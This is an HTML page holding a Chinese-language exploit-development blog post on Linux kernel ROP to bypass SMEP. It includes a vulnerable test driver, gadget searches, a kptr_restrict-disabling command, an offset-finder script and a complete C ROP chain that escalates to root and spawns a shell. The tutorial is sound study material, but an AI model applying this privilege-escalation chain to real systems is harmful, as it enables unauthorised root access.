@@ -1,0 +1,874 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="kernel rop," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="SMEP(Supervisor Mode Execution Protection)的绕过方法一是直接修改CR4的值，二是直接在内核ROP(有点难)。修改CR4最终还是会用到ROP，所以还是先研究下内核ROP。 Intro内核的ROP跟用户空间的ROP没太大区别，差别很小，需要注意的是内核传参一般是通过寄存器而不是栈。我们在实验中通过ROP在内核中执行下面的函数(privilege escalat">
+<meta name="keywords" content="kernel rop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel ROP">
+<meta property="og:url" content="http://yoursite.com/2017/08/06/Linux-Kernel-ROP/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="SMEP(Supervisor Mode Execution Protection)的绕过方法一是直接修改CR4的值，二是直接在内核ROP(有点难)。修改CR4最终还是会用到ROP，所以还是先研究下内核ROP。 Intro内核的ROP跟用户空间的ROP没太大区别，差别很小，需要注意的是内核传参一般是通过寄存器而不是栈。我们在实验中通过ROP在内核中执行下面的函数(privilege escalat">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Kernel ROP">
+<meta name="twitter:description" content="SMEP(Supervisor Mode Execution Protection)的绕过方法一是直接修改CR4的值，二是直接在内核ROP(有点难)。修改CR4最终还是会用到ROP，所以还是先研究下内核ROP。 Intro内核的ROP跟用户空间的ROP没太大区别，差别很小，需要注意的是内核传参一般是通过寄存器而不是栈。我们在实验中通过ROP在内核中执行下面的函数(privilege escalat">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/08/06/Linux-Kernel-ROP/"/>
+
+
+  <title> Linux Kernel ROP | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Linux Kernel ROP
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-08-06T19:47:38+08:00" content="2017-08-06">
+              2017-08-06
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/kernel-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">kernel_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/08/06/Linux-Kernel-ROP/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/06/Linux-Kernel-ROP/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SMEP(Supervisor Mode Execution Protection)的绕过方法一是直接修改CR4的值，二是直接在内核ROP(有点难)。修改CR4最终还是会用到ROP，所以还是先研究下内核ROP。</p>
+<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>内核的ROP跟用户空间的ROP没太大区别，差别很小，需要注意的是内核传参一般是通过寄存器而不是栈。我们在实验中通过ROP在内核中执行下面的函数(privilege escalation)。虽然实际中不会有这么简单，但是我们首先可以通过ROP来改变CR4的值来关闭SMEP，然后就可以在用户空间执行payload提权了。<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __attribute__((regparm(<span class="number">3</span>))) payload() &#123;</div><div class="line">        commit_creds(prepare_kernel_cred(<span class="number">0</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>一般来说，rop chain是如下情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">|----------------------|</div><div class="line">| pop rdi; ret         |&lt;== low mem</div><div class="line">|----------------------|</div><div class="line">| NULL                 |</div><div class="line">|----------------------|</div><div class="line">| addr of              |</div><div class="line">| prepare_kernel_cred()|</div><div class="line">|----------------------|</div><div class="line">| mov rdi, rax; ret    |</div><div class="line">|----------------------|</div><div class="line">| addr of              |</div><div class="line">| commit_creds()       |&lt;== high mem</div><div class="line">|----------------------|</div></pre></td></tr></table></figure></p>
+<p>因为vmlinux文件过大，每次用ROPgadget都要花很长时间，所以就一次性把所有的gadget都写到一个文件中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary vmlinux &gt; ropgadget</div></pre></td></tr></table></figure></p>
+<p>但是在vmlinux找不到mov rdi, rax; ret这个gadget，只找到了如下的gadget：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep ': pop rdi ; ret' ropgadget </div><div class="line">0xffffffff81016bc5 : pop rdi ; ret</div><div class="line"></div><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep ': pop rdx ; ret' ropgadget </div><div class="line">0xffffffff810e00d1 : pop rdx ; ret</div><div class="line"></div><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep 'mov rdi, rax' ropgadget</div><div class="line">0xffffffff8118e3a0 : mov rdi, rax ; call r10</div><div class="line">0xffffffff8142b6d1 : mov rdi, rax ; call r12</div><div class="line">0xffffffff8130217b : mov rdi, rax ; call r14</div><div class="line">0xffffffff81d48ba6 : mov rdi, rax ; call r15</div><div class="line">0xffffffff810d5f34 : mov rdi, rax ; call r8</div><div class="line">0xffffffff8117f534 : mov rdi, rax ; call r9</div><div class="line">0xffffffff8133ed6b : mov rdi, rax ; call rbx</div><div class="line">0xffffffff8105f69f : mov rdi, rax ; call rcx</div><div class="line">0xffffffff810364bf : mov rdi, rax ; call rdx</div></pre></td></tr></table></figure></p>
+<p>其中的vmlinux文件是由<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="external">extract-vmlinux</a>解压boot/vmlinuz*(本身是压缩的内核文件)文件得到的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./extract-vmlinux /boot/vmlinuz-3.13.0-119-generic &gt; vmlinux</div></pre></td></tr></table></figure></p>
+<p>所以rop chain有点改变：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">|----------------------|</div><div class="line">| pop rdi; ret         |&lt;== low mem</div><div class="line">|----------------------|</div><div class="line">| NULL                 |</div><div class="line">|----------------------|</div><div class="line">| addr of              |</div><div class="line">| prepare_kernel_cred()|</div><div class="line">|----------------------|</div><div class="line">| pop rdx; ret         |</div><div class="line">|----------------------|</div><div class="line">| addr of              |</div><div class="line">| commit_creds()       |</div><div class="line">|----------------------|</div><div class="line">| mov rdi, rax;        |</div><div class="line">| call rdx             |&lt;== high mem</div><div class="line">|----------------------|</div></pre></td></tr></table></figure></p>
+<p>需要注意的是在版本较高的linux中，/proc/kallsyms文件中符号的地址都为0，所以也就无法查找prepare_kernel_cred和commit_creds的地址，但是我们通过设置/proc/sys/kernel/kptr_restrict文件中的值来读取符号地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</div></pre></td></tr></table></figure></p>
+<p>然后我们就可以读取内核导出函数的地址了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@w0lfzhang666:/home/w0lfzhang# cat /proc/kallsyms | grep commit_creds</div><div class="line">ffffffff81094350 T commit_creds</div><div class="line">ffffffff81b095d0 R __ksymtab_commit_creds</div><div class="line">ffffffff81b253e0 r __kcrctab_commit_creds</div><div class="line">ffffffff81b348f5 r __kstrtab_commit_creds</div></pre></td></tr></table></figure></p>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>好吧，这个例子应该是该<a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2" target="_blank" rel="external">博客</a>/)的作者根据此<a href="http://cyseclabs.com/slides/smep_bypass.pdf" target="_blank" rel="external">文档</a>中的cve-2013-1763写的。所有的源码及exp都可在<a href="https://github.com/vnik5287/kernel_rop" target="_blank" rel="external">github</a>上下载。漏洞存在如下函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">device_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> args)</span> </span>&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> *<span class="title">req</span>;</span></div><div class="line">	<span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</div><div class="line">	</div><div class="line">	<span class="keyword">switch</span>(cmd) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">		req = (struct drv_req *)args;</div><div class="line">		printk(KERN_INFO <span class="string">"size = %lx\n"</span>, req-&gt;offset);</div><div class="line">        printk(KERN_INFO <span class="string">"fn is at %p\n"</span>, &amp;ops[req-&gt;offset]);</div><div class="line">		fn = &amp;ops[req-&gt;offset];</div><div class="line">		fn();</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>req-&gt;offset没有检查，所以可导致数组越界访问。如果我们精心设置offset的值，那我们几乎可以执行内核空间的任意代码。这个东东看了一天才看懂，到最后自己试验还没成功…直接调试这类LKM又不怎么熟练，郁闷。<br>因为只能在内核中执行代码，而我们无法将rop chain放到内核空间，所以就只能把rop chain放到用户空间中去，怎么放？Stack Pivot！<br>常见的stack pivot指令大致有以下几类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov rXx, rsp ; ret</div><div class="line">add rsp, ...; ret</div><div class="line">xchg rXx, rsp ; ret(xchg eXx, esp ; ret)</div><div class="line">xchg rsp, rXx ; ret(xchg esp, eXx ; ret)</div></pre></td></tr></table></figure></p>
+<p>在64位系统中，xchg rXx, rsp(xchg rsp, rXx ; ret)是个骚操作，只使用32位的寄存器，即xchg eXx, esp或xchg esp, eXx。如果rXx包含有效的内核地址，那么该xchg指令将把rsp设置为rXx的低32位的值(rax也被设置为rsp的低32位)。我们只需要xchg eax, esp这类操作32位寄存器的指令即可。这操作很骚啊~~(虽然不知道咋搞得~)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">   0x400080 &lt;_start&gt;:	movabs rax,0xffffffff00400000</div><div class="line">=&gt; 0x40008a &lt;_start+10&gt;:	xchg   esp,eax</div><div class="line">   0x40008c:	add    BYTE PTR [rsi],ch</div><div class="line">   0x40008e:	jae    0x400109</div><div class="line">   0x400090:	ins    DWORD PTR es:[rdi],dx</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffdd30 --&gt; 0x1 </div><div class="line">0008| 0x7fffffffdd38 --&gt; 0x7fffffffe0e4 ("/home/w0lfzhang/Desktop/kernel_exploit/examples/ROP/a")</div><div class="line">0016| 0x7fffffffdd40 --&gt; 0x0 </div><div class="line">......</div><div class="line"></div><div class="line">   0x400080 &lt;_start&gt;:	movabs rax,0xffffffff00400000</div><div class="line">   0x40008a &lt;_start+10&gt;:	xchg   esp,eax</div><div class="line">=&gt; 0x40008b:	add    BYTE PTR [rsi],ch</div><div class="line">   0x40008d:	jae    0x400108</div><div class="line">   0x40008f:	ins    DWORD PTR es:[rdi],dx</div><div class="line">   0x400090:	je     0x4000f3</div><div class="line">   0x400092:	(bad)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x400000 --&gt; 0x10102464c457f   &lt;== rsp changed</div><div class="line">0008| 0x400008 --&gt; 0x0 </div><div class="line">0016| 0x400010 --&gt; 0x1003e0002 </div><div class="line">......</div></pre></td></tr></table></figure></p>
+<p>所以我们第一步就是让fn()执行stack pivot指令，执行完这个指令后，rsp重定向到用户空间，然后内核会执行用户空间精心布置的rop chain。我们把这类指令写到文件中，然后找出一个合适的gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cat ropgadget | grep &apos;: xchg eax, esp ; ret&apos; &gt; gadgets</div><div class="line"></div><div class="line">gdb-peda$ x/10i *device_ioctl+105</div><div class="line">   0x14a &lt;device_ioctl+105&gt;:	mov    rax,QWORD PTR [rbp-0x10]</div><div class="line">   0x14e &lt;device_ioctl+109&gt;:	mov    rax,QWORD PTR [rax]</div><div class="line">   0x151 &lt;device_ioctl+112&gt;:	shl    rax,0x3</div><div class="line">   0x155 &lt;device_ioctl+116&gt;:	add    rax,0x0</div><div class="line">   0x15b &lt;device_ioctl+122&gt;:	mov    QWORD PTR [rbp-0x8],rax</div><div class="line">   0x15f &lt;device_ioctl+126&gt;:	mov    rax,QWORD PTR [rbp-0x8]</div><div class="line">   0x163 &lt;device_ioctl+130&gt;:	call   rax</div><div class="line">   0x165 &lt;device_ioctl+132&gt;:	nop</div><div class="line">   0x166 &lt;device_ioctl+133&gt;:	mov    eax,0x0</div><div class="line">   0x16b &lt;device_ioctl+138&gt;:	leave</div></pre></td></tr></table></figure></p>
+<p>为什么说找个合适的gadget? 因为并不是所有的gadget都满足的，注意ops是指针数组，是8字节对齐的，所以我们找的gadget地址必须也要8字节对齐。可用以下脚本找到合适的gadget及计算出相应的offset：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#find_offset.py</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">base_addr = int(sys.argv[<span class="number">1</span>], <span class="number">16</span>)</div><div class="line"></div><div class="line">f = open(sys.argv[<span class="number">2</span>], <span class="string">'r'</span>) <span class="comment"># gadgets</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</div><div class="line">        target_str, gadget = line.split(<span class="string">':'</span>)</div><div class="line">        target_addr = int(target_str, <span class="number">16</span>)</div><div class="line"></div><div class="line">        <span class="comment"># check alignment</span></div><div class="line">        <span class="keyword">if</span> target_addr % <span class="number">8</span> != <span class="number">0</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line"></div><div class="line">        offset = (target_addr - base_addr) / <span class="number">8</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'offset ='</span>, (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) + offset</div><div class="line">        <span class="keyword">print</span> <span class="string">'gadget ='</span>, gadget.strip()</div><div class="line">        <span class="keyword">print</span> <span class="string">'stack addr = %x'</span> % (target_addr &amp; <span class="number">0xffffffff</span>)</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>刚开始不懂为什么那个offset要进行1&lt;&lt;64这个骚操作，后来注意到offset是unsigned long，但是好像不要1&lt;&lt;64也没多大关系.</p>
+<p>stack_addr是需要mmmap的用户空间地址。因为这个gadget中的ret后有操作数，所以我们需要在rop chain中做适当的改变。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</div><div class="line">*fake_stack ++= <span class="number">0xffffffff81016bc5</span>UL; <span class="comment">/* pop %rdi; ret */</span></div><div class="line"></div><div class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x14ff</span> + <span class="number">8</span>);</div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0x0</span>UL;                <span class="comment">/* NULL */</span> </div><div class="line">*fake_stack ++= <span class="number">0xffffffff81094630</span>UL; <span class="comment">/* prepare_kernel_cred() */</span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff810e00d1</span>UL; <span class="comment">/* pop %rdx; ret */</span></div><div class="line"><span class="comment">//*fake_stack ++= 0xffffffff81095190UL; /* commit_creds() */</span></div><div class="line">*fake_stack ++= <span class="number">0xffffffff81094356</span>UL; <span class="comment">// commit_creds() + 2 instructions</span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff810364bf</span>UL; <span class="comment">/* mov %rax, %rdi; call %rdx */</span></div></pre></td></tr></table></figure></p>
+<p>至于为什么要把commit_creds的地址后移两个指令。因为当执行完commit_creds后，内核控制流就转移到call rdx的后一条指令了，但是我们还需要在rop chain中执行必要的指令。我们看看commit_creds函数的汇编代码：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> x/10i 0xFFFFFFFF81094350</div><div class="line">   0xffffffff81094350:	call   0xffffffff8173da00</div><div class="line">   0xffffffff81094355:	push   rbp</div><div class="line">   0xffffffff81094356:	mov    rbp,rsp</div><div class="line">   0xffffffff81094359:	push   r13</div><div class="line">   0xffffffff8109435b:	mov    r13,QWORD PTR gs:0xb840</div><div class="line">   0xffffffff81094364:	push   r12</div><div class="line">   0xffffffff81094366:	push   rbx</div><div class="line">   0xffffffff81094367:	mov    r12,QWORD PTR [r13+0x4b0]</div><div class="line">   0xffffffff8109436e:	cmp    r12,QWORD PTR [r13+0x4b8]</div><div class="line">   0xffffffff81094375:	jne    0xffffffff8109454f</div></pre></td></tr></table></figure></p>
+<p>所以我们直接跳过push rbp指令，这样当函数返回时就会把call指令压入的返回地址pop，从而继续执行我们得rop chain。很骚的操作~<br>执行完上述的rop chain，我们需要做的事返回用户空间执行system(“/bin/sh”)，这时就需要用到iretq(64 bit)操作了。我们只需要在stack上布置一个trap_frame即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">|----------------------|</div><div class="line">| rip                  |&lt;== low mem</div><div class="line">|----------------------|</div><div class="line">| cs                   |</div><div class="line">|----------------------|</div><div class="line">| eflags               |      </div><div class="line">|----------------------|</div><div class="line">| rsp                  |</div><div class="line">|----------------------|</div><div class="line">| ss                   |&lt;== high mem</div><div class="line">|----------------------|</div></pre></td></tr></table></figure></p>
+<p>最后需要注意的是，在64bit的系统中执行iret指令前需要执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。<br>最后，将所有的rop chain放在一起：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">save_state();</div><div class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</div><div class="line">*fake_stack ++= <span class="number">0xffffffff81016bc5</span>UL; <span class="comment">/* pop %rdi; ret */</span></div><div class="line"></div><div class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x14ff</span> + <span class="number">8</span>);</div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0x0</span>UL;                <span class="comment">/* NULL */</span> </div><div class="line">*fake_stack ++= <span class="number">0xffffffff81094630</span>UL; <span class="comment">/* prepare_kernel_cred() */</span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff810e00d1</span>UL; <span class="comment">/* pop %rdx; ret */</span></div><div class="line"><span class="comment">//*fake_stack ++= 0xffffffff81095190UL; /* commit_creds() */</span></div><div class="line">*fake_stack ++= <span class="number">0xffffffff81094356</span>UL; <span class="comment">// commit_creds() + 2 instructions</span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff810364bf</span>UL; <span class="comment">/* mov %rax, %rdi; call %rdx */</span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff810515e4</span>UL; <span class="comment">// swapgs </span></div><div class="line"><span class="comment">//*fake_stack ++= 0xdeadbeefUL;       // dummy placeholder </span></div><div class="line"></div><div class="line">*fake_stack ++= <span class="number">0xffffffff81735807</span>UL; <span class="comment">/* iretq */</span></div><div class="line">*fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell; <span class="comment">/* spawn a shell */</span></div><div class="line">*fake_stack ++= user_cs;              <span class="comment">/* saved CS */</span></div><div class="line">*fake_stack ++= user_rflags;          <span class="comment">/* saved EFLAGS */</span></div><div class="line">*fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(temp_stack+<span class="number">0x5000000</span>);  <span class="comment">/* mmaped stack region in user space */</span></div><div class="line">*fake_stack ++= user_ss;              <span class="comment">/* saved SS */</span></div></pre></td></tr></table></figure></p>
